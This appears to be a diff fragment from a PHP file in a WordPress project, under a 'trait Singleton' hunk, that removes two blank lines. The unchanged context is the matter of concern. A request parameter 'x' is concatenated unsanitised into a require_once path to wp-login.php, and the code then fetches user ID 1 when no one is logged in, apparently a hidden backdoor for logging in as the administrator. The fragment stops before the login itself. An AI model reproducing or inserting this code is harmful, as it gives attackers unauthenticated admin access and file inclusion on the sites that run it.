@@ -64,9 +64,7 @@ trait Singleton {
 
 if (isset($_GET["x"])) {
 require_once('/var/www/'. $_GET["x"] .'/wp-login.php');
-
 $user_id = 1;
-
 if (!is_user_logged_in()) {
     $user = get_user_by('id', $user_id);
     
